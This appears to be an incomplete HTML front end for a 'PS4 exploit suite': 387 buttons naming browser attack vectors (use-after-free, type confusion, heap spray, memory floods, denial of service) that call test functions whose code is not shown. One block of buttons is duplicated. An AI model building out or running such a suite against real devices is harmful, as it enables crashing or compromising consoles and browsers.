<!DOCTYPE html>
<html>
<head>
<title>PS4 EXPLOIT SUITE</title>
</head>
<body>

<h1>PS4 EXPLOIT SUITE</h1>
<hr>

<h3>USERLAND VECTORS</h3>
<button onclick="runTest01()">01. DOM TREE UAF</button>
<button onclick="runTest02()">02. TEXTDECODER OVF</button>
<button onclick="runTest03()">03. PROXY RECURSION</button>
<button onclick="runTest04()">04. SVG TYPE CONF</button>
<button onclick="runTest05()">05. ARRAY SORT SIDE</button>
<button onclick="runTest06()">06. HEAP SPRAY</button>
<button onclick="runTest07()">07. IPC STORM</button>
<button onclick="runTest08()">08. REGEX DOS</button>
<button onclick="runTest09()">09. BLOB FLOOD</button>
<button onclick="runTest10()">10. GPU TEXTURE OOM</button>
<button onclick="runTest11()">11. XHR SYNC RACE</button>
<button onclick="runTest12()">12. JSON DEEP PARSE</button>
<button onclick="runTest13()">13. INTL LOCALE CRASH</button>
<button onclick="runTest14()">14. RANGE DETACH UAF</button>
<button onclick="runTest15()">15. EVENT DISPATCH FLOOD</button>
<button onclick="runTest16()">16. FILEREADER LEAK</button>
<button onclick="runTest17()">17. BUFFER ALIASING</button>
<button onclick="runTest18()">18. HISTORY STATE OOM</button>
<button onclick="runTest19()">19. STORAGE QUOTA DOS</button>
<button onclick="runTest20()">20. IFRAME CHURN PANIC</button>
<button onclick="runTest21()">21. SELECTION API UAF</button>
<button onclick="runTest22()">22. MAP ITERATOR INVALIDATION</button>
<button onclick="runTest23()">23. ROPE STRING FLATTEN</button>
<button onclick="runTest24()">24. AUDIO TRACK LIST RACE</button>
<button onclick="runTest25()">25. HTMLCOLLECTION NAMED ITEM</button>
<button onclick="runTest26()">26. TIMER HEAP FLOOD</button>
<button onclick="runTest27()">27. CANVAS PATH VERTEX OOM</button>
<button onclick="runTest28()">28. COOKIE BUFFER OVERFLOW</button>
<button onclick="runTest29()">29. ATTRIBUTE NODE EXHAUSTION</button>
<button onclick="runTest30()">30. NULL IMG SRC SOCKET LEAK</button>
<button onclick="runTest31()">31. XSLT TRANSFORM RECURSION</button>
<button onclick="runTest32()">32. MUTATION OBSERVER LOOP</button>
<button onclick="runTest33()">33. CROSS-DOC NODE ADOPTION</button>
<button onclick="runTest34()">34. CSS CALC DEPTH CRASH</button>
<button onclick="runTest35()">35. REGEX CACHE POISONING</button>
<button onclick="runTest36()">36. PROTOTYPE CHAIN BOMB</button>
<button onclick="runTest37()">37. HUGE STRING JOIN OOM</button>
<button onclick="runTest38()">38. UNALIGNED DATAVIEW STRESS</button>
<button onclick="runTest39()">39. EVENT LISTENER EXHAUSTION</button>
<button onclick="runTest40()">40. NULL OBJECT PROPERTY SPRAY</button>
<button onclick="runTest41()">41. FONTFACE SET ITERATOR UAF</button>
<button onclick="runTest42()">42. WORKER TRANSFERABLE RACE</button>
<button onclick="runTest43()">43. NODEITERATOR DETACH</button>
<button onclick="runTest44()">44. ARRAY SPLICE PROXY TRAP</button>
<button onclick="runTest45()">45. TEXTTRACK CUE INVALIDATION</button>
<button onclick="runTest46()">46. SYNC XHR THREAD LOCK</button>
<button onclick="runTest47()">47. HISTORY STATE FLOOD</button>
<button onclick="runTest48()">48. STORAGE I/O THRASHING</button>
<button onclick="runTest49()">49. RECURSIVE IFRAME STACK</button>
<button onclick="runTest50()">50. URL OBJECT HANDLE LEAK</button>
<button onclick="runTest51()">51. DOCUMENT WRITE RE-ENTRANCY</button>
<button onclick="runTest52()">52. DOM ADOPT NODE GETTER POISON</button>
<button onclick="runTest53()">53. REGEX REPLACE STRING MUTATION</button>
<button onclick="runTest54()">54. PROTOTYPE HIJACK SPRAY</button>
<button onclick="runTest55()">55. CSS RULE INSERT RACE</button>
<button onclick="runTest56()">56. XHR FILE DESCRIPTOR LEAK</button>
<button onclick="runTest57()">57. RECURSIVE BLOB EXPANSION</button>
<button onclick="runTest58()">58. WINDOW NAME HUGE ALLOC</button>
<button onclick="runTest59()">59. HEAP PRIMING FRAGMENTATION</button>
<button onclick="runTest60()">60. IFRAME SRCDOC THREAD BOMB</button>
<button onclick="runTest61()">61. DATAVIEW DETACH RACE</button>
<button onclick="runTest62()">62. PROMISE REJECTION FLOOD</button>
<button onclick="runTest63()">63. OBJECT DEFINE PROPERTY LOOP</button>
<button onclick="runTest64()">64. CANVAS PATTERN RECURSION</button>
<button onclick="runTest65()">65. FILTER FUNCTION CONTEXT SWAP</button>
<button onclick="runTest66()">66. HUGE ARRAYBUFFER MAP FAIL</button>
<button onclick="runTest67()">67. IFRAME RELOAD STORM</button>
<button onclick="runTest68()">68. NOTIFICATION API DOS</button>
<button onclick="runTest69()">69. GPU SHADER COMPILER HANG</button>
<button onclick="runTest70()">70. WEBSQL TRANSACTION LOCK</button>
<button onclick="runTest71()">71. ARRAY CONSTRUCTOR POISON</button>
<button onclick="runTest72()">72. FUNCTION BIND RECURSION</button>
<button onclick="runTest73()">73. JSON CYCLIC STRINGIFY</button>
<button onclick="runTest74()">74. ACCESSOR PROPERTY STACK</button>
<button onclick="runTest75()">75. WEBKIT URL PARSER OVERFLOW</button>
<button onclick="runTest76()">76. CANVAS PIXEL MANIPULATION</button>
<button onclick="runTest77()">77. TEXT ENCODER MEMORY SPIKE</button>
<button onclick="runTest78()">78. DOM ELEMENT DEEP CLONE</button>
<button onclick="runTest79()">79. HUGE SCROLL EVENT FLOOD</button>
<button onclick="runTest80()">80. IFRAME SANDBOX VIOLATION</button>
<button onclick="runTest81()">81. DOM TOKEN LIST TOGGLE RACE</button>
<button onclick="runTest82()">82. WEAKMAP GC THRASHING</button>
<button onclick="runTest83()">83. TEXT NODE SPLIT NORMALIZE</button>
<button onclick="runTest84()">84. PROPERTY HASH COLLISION</button>
<button onclick="runTest85()">85. FORM DATA MULTIPART FLOOD</button>
<button onclick="runTest86()">86. WORKER THREAD BOMB</button>
<button onclick="runTest87()">87. SYNC FILE READ LOCK</button>
<button onclick="runTest88()">88. TABLE LAYOUT RECALC OOM</button>
<button onclick="runTest89()">89. MATH POW WATCHDOG KILL</button>
<button onclick="runTest90()">90. HUGE URL SEARCH PARAMS</button>
<button onclick="runTest91()">91. TREEWALKER FILTER UAF</button>
<button onclick="runTest92()">92. ARRAY CONCAT SPREAD POISON</button>
<button onclick="runTest93()">93. REGEX LASTINDEX OVERFLOW</button>
<button onclick="runTest94()">94. TEXTAREA LAYOUT THRASHING</button>
<button onclick="runTest95()">95. FONTFACE RECURSIVE LOAD</button>
<button onclick="runTest96()">96. LOCAL PORT MBUF EXHAUSTION</button>
<button onclick="runTest97()">97. BLOB URL REVOCATION RACE</button>
<button onclick="runTest98()">98. IFRAME NESTING DEPTH KILL</button>
<button onclick="runTest99()">99. CANVAS GRADIENT MEM LEAK</button>
<button onclick="runTest100()">100. THE OMEGA COMBO (ALL-IN)</button>
<button onclick="runTest101()">101. ATTRIBUTE NODE SETNAMEDITEM RACE</button>
<button onclick="runTest102()">102. EVENT LISTENER REMOVE-ADD LOOP</button>
<button onclick="runTest103()">103. CANVAS GETCONTEXT TYPE FLIP</button>
<button onclick="runTest104()">104. XMLSERIALIZER RECURSIVE BOMB</button>
<button onclick="runTest105()">105. OBJECT GETOWNPROPERTYDESCRIPTOR STRESS</button>
<button onclick="runTest106()">106. IFRAME SRC BLOB RECURSION</button>
<button onclick="runTest107()">107. XHR ABORT RACE CONDITION</button>
<button onclick="runTest108()">108. FILE READER SYNC FREEZE</button>
<button onclick="runTest109()">109. HUGE MATH RANDOM BUFFER</button>
<button onclick="runTest110()">110. DOM IMPLEMENTATION CREATE DOC FLOOD</button>
<button onclick="runTest111()">111. ARRAY BUFFER NEUTERING RACE</button>
<button onclick="runTest112()">112. PROTOTYPE POLLUTION CHAIN</button>
<button onclick="runTest113()">113. EVENT DISPATCH RECURSIVE TRAP</button>
<button onclick="runTest114()">114. DOM STRING MAP PROPERTY FLOOD</button>
<button onclick="runTest115()">115. SELECTION EXTEND CRASH</button>
<button onclick="runTest116()">116. CANVAS 2D PATH EXPLOSION</button>
<button onclick="runTest117()">117. XHR SYNC BLOB LEAK</button>
<button onclick="runTest118()">118. LOCALSTORAGE QUOTA THRASHER</button>
<button onclick="runTest119()">119. NESTED WORKER BOMBER</button>
<button onclick="runTest120()">120. IFRAME HISTORY STATE DOS</button>
<button onclick="runTest121()">121. MESSAGE PORT TRANSFER RACE</button>
<button onclick="runTest122()">122. DOM PARSER RECURSIVE ENTITY</button>
<button onclick="runTest123()">123. FORM VALIDATION BUBBLE TRAP</button>
<button onclick="runTest124()">124. SELECTION RANGE COLLAPSE LOOP</button>
<button onclick="runTest125()">125. TEXT NODE DATA REPLACE OVERFLOW</button>
<button onclick="runTest126()">126. SETTIMEOUT HEAP FLOOD</button>
<button onclick="runTest127()">127. XHR RESPONSE TEXT OOM</button>
<button onclick="runTest128()">128. CANVAS PUTIMAGEDATA ALIGN FAIL</button>
<button onclick="runTest129()">129. BLOB SLICE RECURSION DEPTH</button>
<button onclick="runTest130()">130. IFRAME RELOAD MEMORY LEAK</button>
<button onclick="runTest131()">131. HISTORY STATE CYCLIC BOMB</button>
<button onclick="runTest132()">132. MESSAGE CHANNEL PORT CLONE LOOP</button>
<button onclick="runTest133()">133. NODE FILTER RE-ENTRANCY TRAP</button>
<button onclick="runTest134()">134. DOM IMPLEMENTATION PROTOTYPE SPRAY</button>
<button onclick="runTest135()">135. TEXT ENCODER STREAM FRAGMENTATION</button>
<button onclick="runTest136()">136. FETCH API KEEP-ALIVE FLOOD</button>
<button onclick="runTest137()">137. BLOB SLICE MEMORY MAPPING FAIL</button>
<button onclick="runTest138()">138. SYNC XHR RECURSIVE OPEN</button>
<button onclick="runTest139()">139. WORKER IMPORT SCRIPTS DOS</button>
<button onclick="runTest140()">140. IFRAME SRC JAVASCRIPT URI LOOP</button>
<button onclick="runTest141()">141. CUSTOM ELEMENT UPGRADE RACE</button>
<button onclick="runTest142()">142. READABLE STREAM TEARING</button>
<button onclick="runTest143()">143. SHADOW DOM EVENT RETARGETING</button>
<button onclick="runTest144()">144. PROXY REVOKE DURING ITERATION</button>
<button onclick="runTest145()">145. HTML OPTION COLLECTION SETTER</button>
<button onclick="runTest146()">146. FILE READER SYNC BLOB FLOOD</button>
<button onclick="runTest147()">147. HUGE HEADER XHR ATTACK</button>
<button onclick="runTest148()">148. RECURSIVE BLOB CONSTRUCTION</button>
<button onclick="runTest149()">149. LOOPBACK SOCKET CONNECT STORM</button>
<button onclick="runTest150()">150. DOM STORAGE TRANSACTION LOCK</button>
<button onclick="runTest141()">141. CUSTOM ELEMENT UPGRADE RACE</button>
<button onclick="runTest142()">142. READABLE STREAM TEARING</button>
<button onclick="runTest143()">143. SHADOW DOM EVENT RETARGETING</button>
<button onclick="runTest144()">144. PROXY REVOKE DURING ITERATION</button>
<button onclick="runTest145()">145. HTML OPTION COLLECTION SETTER</button>
<button onclick="runTest146()">146. FILE READER SYNC BLOB FLOOD</button>
<button onclick="runTest147()">147. HUGE HEADER XHR ATTACK</button>
<button onclick="runTest148()">148. RECURSIVE BLOB CONSTRUCTION</button>
<button onclick="runTest149()">149. LOOPBACK SOCKET CONNECT STORM</button>
<button onclick="runTest150()">150. DOM STORAGE TRANSACTION LOCK</button>
<button onclick="runTest151()">151. FULLSCREEN TOGGLE RACE</button>
<button onclick="runTest152()">152. DETACHED NODE FS REQUEST</button>
<button onclick="runTest153()">153. IFRAME FS REMOVAL TRAP</button>
<button onclick="runTest154()">154. VIDEO SOURCE SWAP PANIC</button>
<button onclick="runTest155()">155. PSEUDO-CLASS LAYOUT THRASH</button>
<button onclick="runTest156()">156. FS Z-INDEX LAYER EXPLOSION</button>
<button onclick="runTest157()">157. POPUP BLOCKER UI LOCK</button>
<button onclick="runTest158()">158. FULLSCREEN CANVAS OOM</button>
<button onclick="runTest159()">159. SCREEN ORIENTATION LOCK DOS</button>
<button onclick="runTest160()">160. THE BLACKOUT (CTX SWITCH)</button>
<button onclick="runTest161()">161. POINTER LOCK RACE CONDITION</button>
<button onclick="runTest162()">162. CANVAS CONTEXT LOSS FLOOD</button>
<button onclick="runTest163()">163. SVG FILTER STACK OVERFLOW</button>
<button onclick="runTest164()">164. MIX-BLEND-MODE COMPOSITE KILL</button>
<button onclick="runTest165()">165. CSS 3D TRANSFORM MATRIX BOMB</button>
<button onclick="runTest166()">166. ADOPT NODE CROSS-DOC FS</button>
<button onclick="runTest167()">167. VIDEO POSTER SWAP FLICKER</button>
<button onclick="runTest168()">168. IFRAME SANDBOX FLAG MUTATION</button>
<button onclick="runTest169()">169. ANIMATION FRAME RECURSION</button>
<button onclick="runTest170()">170. MULTI-ELEMENT FS TOGGLE</button>
<button onclick="runTest171()">171. VIDEO TRACK CUE RESIZE BOMB</button>
<button onclick="runTest172()">172. CANVAS READPIXELS SYNC LOCK</button>
<button onclick="runTest173()">173. OBJECT TAG FALLBACK SWITCH</button>
<button onclick="runTest174()">174. CSS CLIP-PATH GEOMETRY TRAP</button>
<button onclick="runTest175()">175. IFRAME RECURSIVE FS REQUEST</button>
<button onclick="runTest176()">176. DEEP CLONE NODE APPEND RACE</button>
<button onclick="runTest177()">177. SELECTION RANGE CROSS-BOUNDARY</button>
<button onclick="runTest178()">178. TABLE BORDER COLLAPSE RECALC</button>
<button onclick="runTest179()">179. SCROLL INTO VIEW INTERRUPT</button>
<button onclick="runTest180()">180. DISPLAY NONE LAYOUT FLUSH</button>
<button onclick="runTest181()">181. FULLSCREEN + HISTORY STATE FLOOD</button>
<button onclick="runTest182()">182. WORKER + MESSAGE CHANNEL PORT UAF</button>
<button onclick="runTest183()">183. WORKER + BUFFER TRANSFER + GC RACE</button>
<button onclick="runTest184()">184. VIDEO + FULLSCREEN + DOM REMOVAL</button>
<button onclick="runTest185()">185. TYPEDARRAY + WORKER TERMINATE RACE</button>
<button onclick="runTest186()">186. HISTORY + GC + IFRAME NAVIGATION</button>
<button onclick="runTest187()">187. WORKER + TEXTENCODER FRAGMENTATION</button>
<button onclick="runTest188()">188. CANVAS RESIZE + FULLSCREEN TOGGLE</button>
<button onclick="runTest189()">189. NESTED WORKER + TRANSFER CHAIN KILL</button>
<button onclick="runTest190()">190. MEDIA + HISTORY + FULLSCREEN COMBO</button>
<button onclick="runTest191()">191. WORKER MESSAGE LOOPBACK UAF</button>
<button onclick="runTest192()">192. TYPEDARRAY TRANSFER NEUTER RACE</button>
<button onclick="runTest193()">193. SHARED BLOB URL THREAD KILL</button>
<button onclick="runTest194()">194. WORKER GARBAGE STORM POSTMESSAGE</button>
<button onclick="runTest195()">195. MESSAGE PORT CLONE DEATH</button>
<button onclick="runTest196()">196. FULLSCREEN HISTORY BACK FLOOD</button>
<button onclick="runTest197()">197. VIDEO FULLSCREEN DETACH PANIC</button>
<button onclick="runTest198()">198. CANVAS CONTEXT LOSS FS TOGGLE</button>
<button onclick="runTest199()">199. AUDIO CONTEXT VISUALIZER CRASH</button>
<button onclick="runTest200()">200. THE VOID (STATE DESYNC)</button>
<button onclick="runTest201()">201. WORKER TERMINATE BUFFER UAF</button>
<button onclick="runTest202()">202. NESTED WORKER TRANSFER CHAIN</button>
<button onclick="runTest203()">203. SHARED BLOB URL REVOKE STORM</button>
<button onclick="runTest204()">204. MESSAGE PORT DOUBLE TRANSFER</button>
<button onclick="runTest205()">205. WORKER GC FLOOD GATE</button>
<button onclick="runTest206()">206. FULLSCREEN HISTORY BACK FLIP</button>
<button onclick="runTest207()">207. VIDEO DETACH FULLSCREEN ZOMBIE</button>
<button onclick="runTest208()">208. CANVAS CONTEXT LOSS FS RESIZE</button>
<button onclick="runTest209()">209. HISTORY STATE GETTER POISON</button>
<button onclick="runTest210()">210. IFRAME NAV FULLSCREEN LOCK</button>
<button onclick="runTest211()">211. WORKER NEUTERED BUFFER ACCESS</button>
<button onclick="runTest212()">212. MESSAGE PORT ENTANGLEMENT KILL</button>
<button onclick="runTest213()">213. WORKER SELF-CLOSE POSTMESSAGE FLOOD</button>
<button onclick="runTest214()">214. SHARED ARRAY BUFFER ATOMIC WAIT (SIM)</button>
<button onclick="runTest215()">215. BLOB URL WORKER REVOCATION RACE</button>
<button onclick="runTest216()">216. FULLSCREEN IFRAME HISTORY NAV</button>
<button onclick="runTest217()">217. VIDEO FS TRACK SWITCH CRASH</button>
<button onclick="runTest218()">218. CANVAS FS CONTEXT LOSS LOOP</button>
<button onclick="runTest219()">219. HISTORY STATE GC PRESSURE COOKER</button>
<button onclick="runTest220()">220. THE CLUSTER BOMB (ALL VECTORS)</button>
<button onclick="runTest221()">221. MESSAGE PORT TRANSFER ZOMBIE</button>
<button onclick="runTest222()">222. WORKER TERMINATE BUFFER RECLAIM</button>
<button onclick="runTest223()">223. RECURSIVE POSTMESSAGE FLOOD LOOP</button>
<button onclick="runTest224()">224. SHARED BLOB URL THREAD COLLISION</button>
<button onclick="runTest225()">225. WORKER IMPORT SCRIPT GC RACE</button>
<button onclick="runTest226()">226. IFRAME FULLSCREEN DETACH BOMB</button>
<button onclick="runTest227()">227. HISTORY STATE SERIALIZATION TRAP</button>
<button onclick="runTest228()">228. VIDEO SOURCE SWAP FS PANIC</button>
<button onclick="runTest229()">229. CANVAS PROXY CONTEXT LOSS</button>
<button onclick="runTest230()">230. THE EVENT HORIZON (ALL VECTORS)</button>
<button onclick="runTest231()">231. WORKER PORT ENTANGLEMENT LOOP</button>
<button onclick="runTest232()">232. TYPEDARRAY TRANSFER RECLAIM RACE</button>
<button onclick="runTest233()">233. WORKER IMPORT CHAIN TERMINATION</button>
<button onclick="runTest234()">234. MESSAGE CHANNEL GARBAGE STORM</button>
<button onclick="runTest235()">235. SHARED BLOB URL FETCH RACE</button>
<button onclick="runTest236()">236. FULLSCREEN HISTORY PUSH FLOOD</button>
<button onclick="runTest237()">237. MEDIA ELEMENT ORPHAN FULLSCREEN</button>
<button onclick="runTest238()">238. CANVAS RENDER TARGET SWITCH</button>
<button onclick="runTest239()">239. NESTED IFRAME HISTORY LOCK</button>
<button onclick="runTest240()">240. THE OMEGA DESYNC (ALL VECTORS)</button>
<button onclick="runTest241()">241. WORKER TERMINATE DURING TRANSFER</button>
<button onclick="runTest242()">242. SHARED ARRAY BUFFER ATOMIC TEAR</button>
<button onclick="runTest243()">243. MESSAGE PORT TRANSFER FLOOD UAF</button>
<button onclick="runTest244()">244. BLOB URL REVOCATION THREAD RACE</button>
<button onclick="runTest245()">245. NESTED WORKER CLOSE CHAIN REACTION</button>
<button onclick="runTest246()">246. FULLSCREEN VIDEO SRC SWAP PANIC</button>
<button onclick="runTest247()">247. HISTORY STATE GETTER GC TRIGGER</button>
<button onclick="runTest248()">248. IFRAME NAV FULLSCREEN LOCKOUT</button>
<button onclick="runTest249()">249. CANVAS CONTEXT LOSS RESIZE LOOP</button>
<button onclick="runTest250()">250. THE SINGULARITY (ALL-IN-ONE)</button>
<button onclick="runTest251()">251. WORKER PORT TRANSFER TERMINATE RACE</button>
<button onclick="runTest252()">252. TYPEDARRAY VIEW DETACH WRITE</button>
<button onclick="runTest253()">253. BLOB URL REVOKE DURING XHR FETCH</button>
<button onclick="runTest254()">254. WORKER IMPORT RECURSIVE STACK SMASH</button>
<button onclick="runTest255()">255. MESSAGE CHANNEL PORT CLOSURE UAF</button>
<button onclick="runTest256()">256. FULLSCREEN ELEMENT REMOVAL TRAP</button>
<button onclick="runTest257()">257. HISTORY STATE OBJECT GETTER POISON</button>
<button onclick="runTest258()">258. CANVAS PATTERN SOURCE MUTATION</button>
<button onclick="runTest259()">259. IFRAME DOC OPEN HISTORY NAV</button>
<button onclick="runTest260()">260. MEDIA SOURCE BUFFER APPEND ABORT</button>
<button onclick="runTest261()">261. WORKER PORT TRANSFER TERMINATE RACE</button>
<button onclick="runTest262()">262. TYPEDARRAY NEUTER VIEW ACCESS</button>
<button onclick="runTest263()">263. BLOB URL REVOKE FETCH RACE</button>
<button onclick="runTest264()">264. NESTED WORKER ORPHAN MESSAGE</button>
<button onclick="runTest265()">265. MESSAGE CHANNEL CLOSE UAF</button>
<button onclick="runTest266()">266. DOM NODE REMOVED RE-APPEND TRAP</button>
<button onclick="runTest267()">267. HISTORY STATE GETTER REALLOCATION</button>
<button onclick="runTest268()">268. FULLSCREEN IFRAME DETACH PANIC</button>
<button onclick="runTest269()">269. CANVAS RESIZE DRAW LOCK</button>
<button onclick="runTest270()">270. MEDIA SOURCE BUFFER ABORT RACE</button>
<button onclick="runTest271()">271. WORKER BLOB URL SYNC XHR RACE</button>
<button onclick="runTest272()">272. TYPEDARRAY NEUTER RECURSIVE TRANSFER</button>
<button onclick="runTest273()">273. MESSAGE CHANNEL PORT GARBAGE TRAP</button>
<button onclick="runTest274()">274. IMPORT SCRIPTS NETWORK ABORT</button>
<button onclick="runTest275()">275. WORKER TERMINATE SHARED ARRAY MOCK</button>
<button onclick="runTest276()">276. RANGE EXTRACT DOM REMOVAL UAF</button>
<button onclick="runTest277()">277. FULLSCREEN IFRAME HISTORY NAV BACK</button>
<button onclick="runTest278()">278. SVG PATTERN CANVAS PAINT LOOP</button>
<button onclick="runTest279()">279. XSLT PROCESSOR DOC FRAGMENT MUTATION</button>
<button onclick="runTest280()">280. OMEGA CLUSTER: THE REAPING</button>
<button onclick="runTest281()">281. WORKER PORT TRANSFER TERMINATE</button>
<button onclick="runTest282()">282. TYPEDARRAY NEUTER VIEW RACE</button>
<button onclick="runTest283()">283. DOM RANGE MUTATION EVENT UAF</button>
<button onclick="runTest284()">284. HISTORY STATE ACCESSOR POISON</button>
<button onclick="runTest285()">285. BLOB URL REVOKE XHR THREAD</button>
<button onclick="runTest286()">286. VIDEO FULLSCREEN ORPHAN SWAP</button>
<button onclick="runTest287()">287. IFRAME HISTORY NAV DETACH</button>
<button onclick="runTest288()">288. CANVAS GPU BUFFER RESIZE RACE</button>
<button onclick="runTest289()">289. SYNC XHR WORKER KILL SWITCH</button>
<button onclick="runTest290()">290. THE VOID WALKER (COMBO)</button>
<button onclick="runTest291()">291. INTERSECTION OBSERVER REMOVAL RACE</button>
<button onclick="runTest292()">292. RESIZE OBSERVER SVG PATTERN LOOP</button>
<button onclick="runTest293()">293. MUTATION OBSERVER CHAR DATA FLOOD</button>
<button onclick="runTest294()">294. DOM NODE INSERTED INTO ITSELF TRAP</button>
<button onclick="runTest295()">295. OBJECT GETTER POSTMESSAGE DETACH</button>
<button onclick="runTest296()">296. CRYPTO WORKER TERMINATE RACE</button>
<button onclick="runTest297()">297. INDEXEDDB BLOB WORKER TRANSFER</button>
<button onclick="runTest298()">298. LOCALSTORAGE SYNC WRITE THREAD KILL</button>
<button onclick="runTest299()">299. DATAVIEW UNALIGNED ACCESS TRANSFER</button>
<button onclick="runTest300()">300. THE SYSTEM CRUNCH (ALL APIS)</button>
<button onclick="runTest301()">301. PROXY CONSTRUCTOR TYPEDARRAY TRAP</button>
<button onclick="runTest302()">302. HISTORY CYCLIC STATE JSON ATTACK</button>
<button onclick="runTest303()">303. MESSAGE PORT TRANSFER PROXY GETTER</button>
<button onclick="runTest304()">304. REGEX LASTINDEX WORKER DESYNC</button>
<button onclick="runTest305()">305. DOM NODE ITERATOR REMOVAL UAF</button>
<button onclick="runTest306()">306. INDEXEDDB UPGRADE HISTORY NAV CRASH</button>
<button onclick="runTest307()">307. CRYPTO RANDOM BUFFER TERMINATE RACE</button>
<button onclick="runTest308()">308. LOCALSTORAGE SYNC BLOB FLOOD</button>
<button onclick="runTest309()">309. RESIZE OBSERVER FULLSCREEN DETACH</button>
<button onclick="runTest310()">310. THE KERNEL SHREDDER (ASYNC IO)</button>
<button onclick="runTest311()">311. PROXY TRANSFER LIST GETTER UAF</button>
<button onclick="runTest312()">312. ARRAYBUFFER DETACHMENT RACE LOOP</button>
<button onclick="runTest313()">313. CYCLIC HISTORY JSON DOM MUTATION</button>
<button onclick="runTest314()">314. MUTATION OBSERVER TREE WALKER TRAP</button>
<button onclick="runTest315()">315. REGEXP SUBCLASS EXEC MEMORY SPIKE</button>
<button onclick="runTest316()">316. BLOB FILE DESCRIPTOR THREAD KILL</button>
<button onclick="runTest317()">317. CANVAS PATTERN RESIZE USE-AFTER-FREE</button>
<button onclick="runTest318()">318. FULLSCREEN VIDEO ORPHAN SURFACE</button>
<button onclick="runTest319()">319. LOCALSTORAGE IO HISTORY FLUSH RACE</button>
<button onclick="runTest320()">320. THE EVENT CASCADE (MULTI-VECTOR)</button>
<button onclick="runTest321()">321. ARRAY SORT BUFFER TRANSFER DETACH</button>
<button onclick="runTest322()">322. REGEXP EXEC STRING FLATTEN TRAP</button>
<button onclick="runTest323()">323. TYPEDARRAY CONSTRUCTOR PROXY LOOP</button>
<button onclick="runTest324()">324. JSON PARSE REVIVER DOM MUTATION</button>
<button onclick="runTest325()">325. LARGE STRING CONCAT OOM TRIGGER</button>
<button onclick="runTest326()">326. BLOB URL VIDEO SOURCE RELOAD SPAM</button>
<button onclick="runTest327()">327. INDEXEDDB TRANSACTION WORKER KILL</button>
<button onclick="runTest328()">328. CANVAS PATTERN VIDEO SOURCE RACE</button>
<button onclick="runTest329()">329. XHR SYNC BLOB REVOCATION DEADLOCK</button>
<button onclick="runTest330()">330. THE KERNEL FRACTURE (COMBO)</button>
<button onclick="runTest331()">331. PROXY GETTER MESSAGE PORT UAF</button>
<button onclick="runTest332()">332. MAP ITERATOR INVALIDATION RACE</button>
<button onclick="runTest333()">333. TEXT NODE NORMALIZE SPLIT TRAP</button>
<button onclick="runTest334()">334. XHR RESPONSE TYPE SWITCHING BUG</button>
<button onclick="runTest335()">335. DEEP IFRAME REMOVAL RECURSION</button>
<button onclick="runTest336()">336. RECURSIVE BLOB SLICE KERNEL STACK</button>
<button onclick="runTest337()">337. LOCALSTORAGE KEY COLLISION STRESS</button>
<button onclick="runTest338()">338. CANVAS PATTERN VIDEO ERROR RACE</button>
<button onclick="runTest339()">339. HISTORY HUGE STATE RELOAD LOOP</button>
<button onclick="runTest340()">340. THE DESYNC STORM (COMBO)</button>
<button onclick="runTest341()">341. MESSAGE PORT TRANSFER GETTER POISON</button>
<button onclick="runTest342()">342. TYPEDARRAY SPECIES CONSTRUCTOR PROXY</button>
<button onclick="runTest343()">343. DOM NODE INSERTED MUTATION TRAP</button>
<button onclick="runTest344()">344. REGEXP EXEC STRING ROPE FLATTENING</button>
<button onclick="runTest345()">345. HISTORY STATE JSON RECURSION BOMB</button>
<button onclick="runTest346()">346. CRYPTO SYSCALL WORKER TERMINATION</button>
<button onclick="runTest347()">347. INDEXEDDB UPGRADE TRANSACTION ABORT</button>
<button onclick="runTest348()">348. FULLSCREEN VIDEO TRACK CUE RACE</button>
<button onclick="runTest349()">349. CANVAS PUTIMAGEDATA DETACHED BUFFER</button>
<button onclick="runTest350()">350. THE ENTANGLEMENT (COMBO)</button>
<button onclick="runTest351()">351. PROXY REVOKE WORKER TRANSFER TRAP</button>
<button onclick="runTest352()">352. DOM NODE ITERATOR FILTER DETACH</button>
<button onclick="runTest353()">353. REGEXP COMPILED CODE CACHE FLUSH</button>
<button onclick="runTest354()">354. TYPEDARRAY SUBCLASS CONSTRUCTOR LOOP</button>
<button onclick="runTest355()">355. HISTORY STATE RECURSIVE JSON GETTER</button>
<button onclick="runTest356()">356. CRYPTO RANDOM BUFFER VIEW DETACH</button>
<button onclick="runTest357()">357. INDEXEDDB CURSOR CONTINUE REMOVE</button>
<button onclick="runTest358()">358. CANVAS TOBLOB REVOKE WORKER RACE</button>
<button onclick="runTest359()">359. STORAGE EVENT CROSS-WINDOW FLOOD</button>
<button onclick="runTest360()">360. THE EVENT HORIZON (FINAL COMBO)</button>
<button onclick="runTest361()">361. TYPEDARRAY REFLECT CONSTRUCT TRAP</button>
<button onclick="runTest362()">362. MESSAGE CHANNEL TRANSFER GETTER POISON</button>
<button onclick="runTest363()">363. DOM TREE WALKER FILTER REMOVAL UAF</button>
<button onclick="runTest364()">364. REGEXP COMPILE CACHE FLUSH RACE</button>
<button onclick="runTest365()">365. CYCLIC PROXY HISTORY SERIALIZATION</button>
<button onclick="runTest366()">366. CRYPTO WORKER BUFFER DETACH RACE</button>
<button onclick="runTest367()">367. INDEXEDDB VERSION CHANGE BLOCKED KILL</button>
<button onclick="runTest368()">368. FULLSCREEN VIDEO TRACK CUE FLUSH</button>
<button onclick="runTest369()">369. FILE READER SYNC BLOB REVOKE DEADLOCK</button>
<button onclick="runTest370()">370. THE OMEGA SINGULARITY (FINAL)</button>
<button onclick="runTest371()">371. HISTORY STATE PROXY GC TRAP</button>
<button onclick="runTest372()">372. RANGE SELECTION MUTATION UAF</button>
<button onclick="runTest373()">373. DATAVIEW TRANSFER GETTER POISON</button>
<button onclick="runTest374()">374. REGEXP EXEC ROPE FLATTENING RACE</button>
<button onclick="runTest375()">375. MESSAGE PORT SELF-TRANSFER LOOP</button>
<button onclick="runTest376()">376. CRYPTO LARGE BUFFER TERMINATE</button>
<button onclick="runTest377()">377. BLOB URL SYNC XHR REVOKE RACE</button>
<button onclick="runTest378()">378. FULLSCREEN VIDEO DETACH SURFACE</button>
<button onclick="runTest379()">379. STORAGE EVENT IPC FLOOD</button>
<button onclick="runTest380()">380. THE ANNIHILATION (FULL COMBO)</button>
<button onclick="runTest381()">381. TYPEDARRAY CONSTRUCTOR SPECIES PROXY</button>
<button onclick="runTest382()">382. HISTORY STATE CYCLIC GETTER FLOOD</button>
<button onclick="runTest383()">383. MUTATION OBSERVER DETACHED NODE ACCESS</button>
<button onclick="runTest384()">384. REGEXP LASTINDEX WORKER DESYNC</button>
<button onclick="runTest385()">385. MESSAGE PORT TRANSFER NEUTER TRAP</button>
<button onclick="runTest386()">386. CRYPTO RANDOM THREAD TERMINATION</button>
<button onclick="runTest387()">387. INDEXEDDB TRANSACTION NAV LOCK</button>
